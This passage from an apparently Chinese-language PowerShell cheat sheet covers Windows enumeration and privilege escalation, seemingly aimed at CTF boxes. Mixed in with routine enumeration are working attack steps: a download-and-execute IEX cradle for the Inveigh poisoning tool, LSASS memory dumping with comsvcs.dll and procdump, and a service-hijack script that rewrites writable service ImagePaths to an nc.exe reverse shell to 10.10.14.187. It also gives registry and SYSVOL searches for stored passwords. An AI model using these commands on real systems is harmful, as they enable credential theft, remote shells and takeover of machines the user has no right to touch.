<br></code></pre></td></tr></table></figure>

<ul>
<li>导出 DNS 区域</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-DNSServerZone</span><br><span class="hljs-built_in">Export-DnsServerZone</span> <span class="hljs-literal">-Name</span> localnet.domain <span class="hljs-literal">-FileName</span> dns<span class="hljs-literal">-export</span>.txt<br><span class="hljs-comment">## File was exported to C:\Windows\system32\dns\dns-export.txt</span><br></code></pre></td></tr></table></figure>

<ul>
<li>回复者[<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Inveigh">责备</a>]</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/Kevin<span class="hljs-literal">-Robertson</span>/Inveigh/master/Inveigh.ps1<br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://&lt;IP&gt;/Inveigh.ps1&#x27;</span>)<br><span class="hljs-built_in">Invoke-Inveigh</span> <span class="hljs-literal">-ConsoleOutput</span> Y <span class="hljs-literal">-NBNS</span> Y <span class="hljs-literal">-mDNS</span> Y <span class="hljs-literal">-Proxy</span> Y <span class="hljs-literal">-LogOutput</span> Y <span class="hljs-literal">-FileOutput</span> Y  <br></code></pre></td></tr></table></figure>

<h3 id="01-4-进程-服务枚举"><a href="#01-4-进程-服务枚举" class="headerlink" title="01.4 进程&#x2F;服务枚举"></a>01.4 进程&#x2F;服务枚举</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| List all Process </span><br><span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-name</span> firefox<br>tasklist /v | findstr smss<br><span class="hljs-built_in">ps</span> | findstr smss<br><br><span class="hljs-comment">## ------------------| List all services</span><br><span class="hljs-built_in">Get-Service</span><br><span class="hljs-built_in">sc</span> query state=all<br><span class="hljs-built_in">get-wmiobject</span> win32_service<br><span class="hljs-comment">## If all above commands are failed; try following</span><br><span class="hljs-built_in">Set-Location</span> <span class="hljs-string">&#x27;HKLM:\SYSTEM\CurrentControlSet\Services&#x27;</span><br><span class="hljs-built_in">Get-ChildItem</span> . | <span class="hljs-built_in">select</span> name<br><span class="hljs-built_in">Get-ChildItem</span> . | <span class="hljs-built_in">where-object</span> &#123; <span class="hljs-variable">$_</span>.Name <span class="hljs-operator">-like</span> <span class="hljs-string">&#x27;*EnterServiceNameHere*&#x27;</span> <br><br><span class="hljs-comment">## ------------------| Processes are running as &quot;system&quot;</span><br>tasklist /v /fi <span class="hljs-string">&quot;username eq system&quot;</span><br><br><span class="hljs-comment">## ------------------| Kill process</span><br>taskkill /f /im:filename.exe<br><br><span class="hljs-comment">## ------------------| 计划的任务</span><br><span class="hljs-comment">### List all tasks</span><br>schtasks /query /fo LIST /v<br><span class="hljs-comment">### Run task</span><br>schtasks /RUN /RN <span class="hljs-string">&quot;\NameHere&quot;</span><br><br><span class="hljs-comment">## ------------------| Start Service (Stop,Restart)</span><br><span class="hljs-comment">## 使用上述方法获取显示名称</span><br><span class="hljs-built_in">Stop-Service</span> <span class="hljs-string">&quot;Ubiquiti UniFi Video&quot;</span><br><span class="hljs-built_in">Start-Service</span> <span class="hljs-string">&quot;Ubiquiti UniFi Video&quot;</span><br>net stop EnterServiceNameHere<br>net <span class="hljs-built_in">start</span> EnterServiceNameHere<br>sc.exe stop EnterServiceNameHere<br>sc.exe <span class="hljs-built_in">start</span> EnterServiceNameHere<br><br><span class="hljs-comment">## ------------------| 检查基本服务属性</span><br><span class="hljs-built_in">Get-Service</span> nscp | <span class="hljs-built_in">fl</span> *<br><br><span class="hljs-comment">## ------------------| List loaded assemblies</span><br>[<span class="hljs-type">appdomain</span>]::currentdomain.getassemblies() | <span class="hljs-built_in">Sort-Object</span> <span class="hljs-literal">-Property</span> fullname | <span class="hljs-built_in">Format-Table</span> fullname<br><br><span class="hljs-comment">## ------------------| List only running services</span><br><span class="hljs-built_in">Get-Service</span> | <span class="hljs-built_in">where</span> &#123;<span class="hljs-variable">$_</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Running&quot;</span>&#125; <br><br>wmic service get name, displayname, pathname, startmode | findstr /i <span class="hljs-string">&quot;Auto&quot;</span> | findstr /i /V <span class="hljs-string">&quot;C:\Windows&quot;</span> | findstr /i /V <span class="hljs-string">&quot;&#x27;&#x27;&quot;</span>    <br></code></pre></td></tr></table></figure>

<ul>
<li>可修改的服务</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 修改UsoSvc服务bin路径</span><br>sc.exe config UsoSvc binpath=<span class="hljs-string">&quot;cmd.exe /c powershell -EncodedCommand SQBFAFgAKABOA.....ApAA==&quot;</span>    <br><br><span class="hljs-comment">## ------------------| Restart the UsoSvc service </span><br>sc.exe stop UsoSvc <br>sc.exe <span class="hljs-built_in">start</span> UsoSvc <br></code></pre></td></tr></table></figure>

<ul>
<li>转储过程</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 使用rundll32转储进程 </span><br><span class="hljs-built_in">get-process</span> <br>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump &lt;PID&gt; &lt;PATH<span class="hljs-literal">-TO-SAVE-FILE</span>&gt; full<br><span class="hljs-comment">## Dumping Lsass Without Mimikatz]</span><br>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <span class="hljs-number">624</span> C:\Users\Public\Documents\lsass.dmp<br><br><span class="hljs-comment">## ------------------| 使用ProcDump的转储进程</span><br>./procdump.exe <span class="hljs-literal">-accepteula</span> <span class="hljs-literal">-ma</span> &lt;PID&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li>列出已安装的程序</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-string">&#x27;C:\Program Files&#x27;</span>, <span class="hljs-string">&#x27;C:\Program Files (x86)&#x27;</span> | <span class="hljs-built_in">ft</span> Parent,Name,LastWriteTime<br><span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-path</span> Registry::HKEY_LOCAL_MACHINE\SOFTWARE | <span class="hljs-built_in">ft</span> Name<br></code></pre></td></tr></table></figure>

<h3 id="01-5-注册表枚举"><a href="#01-5-注册表枚举" class="headerlink" title="01.5 注册表枚举"></a>01.5 注册表枚举</h3><ul>
<li>服务注册表枚举</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 检查用户是否具有FullControl</span><br>accesschk.exe <span class="hljs-string">&quot;&lt;USER&gt;&quot;</span> <span class="hljs-literal">-kwsu</span> HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services<br><span class="hljs-comment">## or -----------------------------------------------------------</span><br><span class="hljs-variable">$acl</span> = <span class="hljs-built_in">get-acl</span> HKLM:\SYSTEM\CurrentControlSet\Services; <span class="hljs-built_in">ConvertFrom-SddlString</span> <span class="hljs-literal">-Sddl</span> <span class="hljs-variable">$acl</span>.Sddl | <span class="hljs-built_in">Foreach-Object</span> &#123;<span class="hljs-variable">$_</span>.DiscretionaryAcl&#125;                                      <br><br><span class="hljs-comment">## ------------------| 找到一个我可以重新启动的系列</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;C:\inetpub\wwwroot\uploads\nc.exe 10.10.14.187 444 -e powershell.exe&quot;</span>\<br><span class="hljs-comment"># 创建服务列表</span><br><span class="hljs-variable">$otp</span> = ./accesschk.exe <span class="hljs-string">&quot;Hector&quot;</span> <span class="hljs-literal">-kvuqsv</span> hklm:\System\CurrentControlSet\Services<br><span class="hljs-variable">$services</span> = <span class="hljs-variable">$otp</span>.Split([<span class="hljs-type">Environment</span>]::NewLine)<br><span class="hljs-comment"># 通过每项服务Lopp</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$service</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$services</span>) &#123;<br>    <span class="hljs-comment"># 如果当前线路不是服务，请跳过它</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$service</span>.StartsWith(<span class="hljs-string">&quot;RW HKLM&quot;</span>)) &#123;<br>        <span class="hljs-keyword">continue</span><br>    &#125;<br>    <span class="hljs-comment"># 验证线路是否确实是一项服务</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$service</span>.Split(<span class="hljs-string">&quot;\\&quot;</span>)[-<span class="hljs-number">1</span>].Split([<span class="hljs-type">Environment</span>]::NewLine)[<span class="hljs-number">0</span>]<br>    <span class="hljs-variable">$s</span> = <span class="hljs-built_in">Get-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-variable">$name</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$s</span>) &#123;<br>        <span class="hljs-keyword">continue</span><br>    &#125;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$service</span><br>    <span class="hljs-variable">$serv</span> = <span class="hljs-variable">$service</span>.Split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>].Split([<span class="hljs-type">Environment</span>]::NewLine)[<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$serv</span><br>    <span class="hljs-comment"># 试图利用该服务进行攻击：</span><br>    <span class="hljs-comment"># 1.将服务的二进制路径更改为$cmd</span><br>    <span class="hljs-comment"># 2.重新启动服务</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&#x27;Running&#x27;</span>) &#123;<br>        reg add <span class="hljs-variable">$serv</span> /v ImagePath /t REG_EXPAND_SZ /d <span class="hljs-string">&quot;<span class="hljs-variable">$cmd</span>&quot;</span> /f &gt;a.txt<br>        <span class="hljs-keyword">if</span>((<span class="hljs-built_in">Get-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-variable">$name</span>).Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&#x27;Running&#x27;</span>) &#123;<br>            <span class="hljs-built_in">Get-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-variable">$name</span> | <span class="hljs-built_in">Stop-Service</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br>            <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[STOP] &quot;</span><span class="hljs-variable">$name</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$s</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&#x27;Stopped&#x27;</span>) &#123;<br>        reg add <span class="hljs-variable">$serv</span> /v ImagePath /t REG_EXPAND_SZ /d <span class="hljs-string">&quot;<span class="hljs-variable">$cmd</span>&quot;</span> /f &gt;a.txt<br>        <span class="hljs-keyword">if</span>((<span class="hljs-built_in">Get-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-variable">$name</span>).Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&#x27;Stopped&#x27;</span>) &#123;<br>            <span class="hljs-built_in">Get-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-variable">$name</span> | <span class="hljs-built_in">Start-Service</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br>            <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[START] &quot;</span><span class="hljs-variable">$name</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="01-6-文件枚举"><a href="#01-6-文件枚举" class="headerlink" title="01.6 文件枚举"></a>01.6 文件枚举</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 列出所有文件，包括隐藏的文件</span><br><span class="hljs-built_in">dir</span> <span class="hljs-literal">-force</span><br><span class="hljs-built_in">dir</span> /b/s C:\ flag.txt<br><span class="hljs-built_in">where</span> /<span class="hljs-built_in">R</span> C:\ flag.txt<br><span class="hljs-built_in">gci</span> <span class="hljs-literal">-r</span> . user.txt<br><span class="hljs-built_in">gci</span> <span class="hljs-literal">-recurse</span> | <span class="hljs-built_in">select</span> FullName<br><span class="hljs-built_in">gci</span> <span class="hljs-literal">-recurse</span> C:\Users\ user.txt<br><span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-Path</span> C:\Users <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Include</span> root.txt,user.txt | <span class="hljs-built_in">select</span> Fullname<br><br><span class="hljs-comment">## ------------------| 获取文件流数据</span><br>cmd /c <span class="hljs-built_in">dir</span> /<span class="hljs-built_in">r</span><br><span class="hljs-built_in">Get-Item</span> &lt;FileName&gt; <span class="hljs-literal">-Stream</span> *<br><span class="hljs-built_in">Get-Content</span> &lt;FileName&gt; <span class="hljs-literal">-Stream</span> &lt;StreamName&gt;<br><br><span class="hljs-comment">## ------------------| 列出所有仅具有扩展名的文件</span><br><span class="hljs-built_in">gci</span> <span class="hljs-literal">-recurse</span> <span class="hljs-literal">-include</span> *.* | <span class="hljs-built_in">select</span> FullName<br><br><span class="hljs-comment">## ------------------| 替换某些单词（sed）</span><br>((<span class="hljs-built_in">cat</span> ..\path\to\file.txt <span class="hljs-literal">-Raw</span>) <span class="hljs-operator">-replace</span> <span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>) | <span class="hljs-built_in">sc</span> <span class="hljs-literal">-path</span> ..\path\to\new\file.txt <br><br><span class="hljs-comment">## ------------------| 列出所有已安装的驱动程序/版本</span><br>driverquery.exe /v /fo csv | <span class="hljs-built_in">ConvertFrom-CSV</span> | <span class="hljs-built_in">Select-Object</span> <span class="hljs-string">&#x27;Display Name&#x27;</span>, <span class="hljs-string">&#x27;Start mode&#x27;</span>, Path<br><span class="hljs-built_in">Get-WmiObject</span> Win32_PnPSignedDriver | <span class="hljs-built_in">Select-Object</span> DeviceName, DriverVersion, Manufacturer | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.DeviceName <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;*VMware*&quot;</span>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>高级搜索</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 搜索文件内容</span><br><span class="hljs-built_in">cd</span> C:\ &amp; findstr /<span class="hljs-built_in">SI</span> /M <span class="hljs-string">&quot;password&quot;</span> *.xml *.ini *.txt<br>findstr /<span class="hljs-built_in">si</span> password *.xml *.ini *.txt *.config<br>findstr /spin <span class="hljs-string">&quot;password&quot;</span> *.*<br><br><span class="hljs-comment">## ------------------| 搜索具有特定文件名的文件</span><br><span class="hljs-built_in">dir</span> /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*<br><span class="hljs-built_in">where</span> /<span class="hljs-built_in">R</span> C:\ user.txt<br><span class="hljs-built_in">where</span> /<span class="hljs-built_in">R</span> C:\ *.ini<br><br><span class="hljs-comment">## ------------------| 搜索文件中的字符串</span><br><span class="hljs-built_in">IWR</span> <span class="hljs-literal">-Uri</span> <span class="hljs-string">&quot;https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Find-Strings.ps1&quot;</span> <span class="hljs-literal">-OutFile</span> <span class="hljs-string">&quot;Find-Strings.ps1&quot;</span><br>.\<span class="hljs-built_in">Find-Strings</span>.ps1 <span class="hljs-literal">-stopAt</span> <span class="hljs-string">&quot;5&quot;</span><br>.\<span class="hljs-built_in">Find-strings</span>.ps1 <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;<span class="hljs-variable">$Env:TMP</span>&quot;</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;pass=|passwd=|password=&quot;</span><br>.\<span class="hljs-built_in">Find-strings</span>.ps1 <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;<span class="hljs-variable">$Env:USERPROFILE</span>&quot;</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;[^<span class="hljs-variable">$</span>]password=&quot;</span><br><br><span class="hljs-comment">## ------------------| 在SYSVOL中查找GPP密码</span><br><span class="hljs-built_in">dir</span> <span class="hljs-string">&quot;C:\ProgramData\Microsoft\Group Policy\History\&quot;</span><br>findstr /S cpassword <span class="hljs-variable">$env:logonserver</span>\sysvol\*.xml<br>findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)<br>findstr /S /I cpassword \\&lt;DOMAIN&gt;\sysvol\&lt;DOMAIN&gt;\policies\*.xml<br><br><span class="hljs-comment">## ------------------| 搜索Windows自动登录</span><br>REG QUERY <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&quot;</span> /v DefaultPassword /reg:<span class="hljs-number">64</span><br>REG QUERY <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span> | findstr <span class="hljs-string">&quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span><br>REG QUERY <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span> <br><br><span class="hljs-comment">## ------------------| 在注册表中搜索注册表项名称和密码</span><br>REG QUERY HKLM /F <span class="hljs-string">&quot;password&quot;</span> /t REG_SZ /S /K<br>REG QUERY HKCU /F <span class="hljs-string">&quot;password&quot;</span> /t REG_SZ /S /K<br><br><span class="hljs-comment">## ------------------| 搜索SNMP参数</span><br>REG QUERY <span class="hljs-string">&quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span> <br><br><span class="hljs-comment">## ------------------| 搜索Putty明文代理凭据</span><br>REG QUERY <span class="hljs-string">&quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br><br><span class="hljs-comment">## ------------------| 搜索VNC凭据</span><br>REG QUERY <span class="hljs-string">&quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span><br>REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password<br><br>REG QUERY HKLM /f password /t REG_SZ /s<br>REG QUERY HKCU /f password /t REG_SZ /s<br><br><span class="hljs-comment">## ------------------| 搜索不安全的文件权限（选中“世界可写”）</span><br><span class="hljs-comment">### Tool : https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</span><br>accesschk.exe /accepteula <span class="hljs-literal">-uwcqv</span> <span class="hljs-string">&quot;Authenticated Users&quot;</span> *<br>accesschk.exe /accepteula <span class="hljs-literal">-uws</span> <span class="hljs-string">&quot;Everyone&quot;</span> <span class="hljs-string">&quot;C:\Program Files&quot;</span><br><br><span class="hljs-comment">## ------------------| 备份便笺</span><br><span class="hljs-comment">### Win 10 New (Version 1607)</span><br><span class="hljs-built_in">cd</span> C:\Users\&lt;USERNAME&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState<br><span class="hljs-comment">### Win 10/7/8 (Version 1511)</span><br><span class="hljs-built_in">cd</span> C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Sticky Notes<br><span class="hljs-comment">## copy all plum.* files; then use sqlite to extrack</span><br></code></pre></td></tr></table></figure>

<ul>
<li>弱权限</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| File\Folder</span><br>icacls <span class="hljs-string">&quot;C:\Program Files (x86)\*&quot;</span> <span class="hljs-number">2</span>&gt;null | findstr <span class="hljs-string">&quot;(F) (M) :\&quot;</span> | findstr <span class="hljs-string">&quot;:\ everyone authenticated users todos %username%&quot;</span>     <br>icacls <span class="hljs-string">&quot;C:\Program Files\*&quot;</span> <span class="hljs-number">2</span>&gt;null | findstr <span class="hljs-string">&quot;(F) (M) :\&quot;</span> | findstr <span class="hljs-string">&quot;:\ everyone authenticated users todos %username%&quot;</span><br><br><span class="hljs-comment">## ------------------| Service </span><br>wmic service get name, displayname, pathname, startmode | findstr /i <span class="hljs-string">&quot;Auto&quot;</span> | findstr /i /V <span class="hljs-string">&quot;C:\Windows&quot;</span> | findstr /i /V <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">Get-WmiObject</span> win32_service | <span class="hljs-built_in">Select-Object</span> Name, State, PathName | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.State <span class="hljs-operator">-like</span> <span class="hljs-string">&#x27;Running&#x27;</span>&#125; | findstr <span class="hljs-string">&quot;Program&quot;</span>     <br>icacls <span class="hljs-string">&quot;C:\Program Files (x86)\*&quot;</span> <span class="hljs-number">2</span>&gt;null | findstr <span class="hljs-string">&quot;BUILTIN\Users:(I)(F)&quot;</span><br>icacls <span class="hljs-string">&quot;C:\Program Files\*&quot;</span> <span class="hljs-number">2</span>&gt;null | findstr <span class="hljs-string">&quot;BUILTIN\Users:(I)(F)&quot;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>设置&#x2F;检查权限</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Check</span><br><span class="hljs-built_in">Get-ACL</span> folder<span class="hljs-operator">-or</span><span class="hljs-operator">-file</span><span class="hljs-literal">-name</span> | <span class="hljs-built_in">FL</span> *<br><span class="hljs-built_in">Get-ACL</span> root.txt | <span class="hljs-built_in">FL</span> AccessToString<br><br><span class="hljs-comment">## ------------------| 设置完全控制</span><br>cacls root.txt /t /e /p UserName:F<br><br><span class="hljs-comment">## ------------------| 从ACL中删除用户</span><br>cacls root.txt /e /<span class="hljs-built_in">r</span> UserName<br><br><span class="hljs-comment">#---------------- cacls命令帮助</span><br><span class="hljs-comment"># /e    编辑ACL而不是替换它。</span><br><span class="hljs-comment"># /t    更改当前目录和所有子目录中指定文件的ACL。</span><br><span class="hljs-comment"># /p user:&lt;perm&gt; 替换指定用户的访问权限，包括以下有效的权限值：</span><br><span class="hljs-comment">#  |-&gt;   n - None</span><br><span class="hljs-comment">#  |-&gt;   r - Read</span><br><span class="hljs-comment">#  |-&gt;   w - Write</span><br><span class="hljs-comment">#  |-&gt;   c - Change (write)</span><br><span class="hljs-comment">#  |-&gt;   f - Full control</span><br><br><span class="hljs-comment">## ------------------| 搜索不安全的文件权限（选中“世界可写”）</span><br><span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-string">&quot;C:\Program Files&quot;</span> <span class="hljs-literal">-Recurse</span> | <span class="hljs-built_in">Get-ACL</span> | ?&#123;<span class="hljs-variable">$_</span>.AccessToString <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;Everyone\sAllow\s\sModify&quot;</span>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>枚举快捷方式 ( <code>.lnk</code>)</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$Wscript</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> Wscript.Shell<br><span class="hljs-variable">$shortcut</span> = <span class="hljs-built_in">Get-ChildItem</span> *.lnk<br><span class="hljs-variable">$Wscript</span>.CreateShortcut(<span class="hljs-variable">$shortcut</span>)<br></code></pre></td></tr></table></figure>

<ul>
<li>压缩并解压 zip 文件</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 压紧</span><br><span class="hljs-built_in">Compress-Archive</span> <span class="hljs-literal">-LiteralPath</span> &lt;PathToFiles&gt; <span class="hljs-literal">-DestinationPath</span> &lt;PathToDestination&gt;.zip            <br><br><span class="hljs-comment">## ------------------| 提取/解压缩</span><br><span class="hljs-built_in">Expand-Archive</span> <span class="hljs-literal">-LiteralPath</span> &lt;PathToZipFile&gt;.zip <span class="hljs-literal">-DestinationPath</span> &lt;PathToDestination&gt;<br></code></pre></td></tr></table></figure>

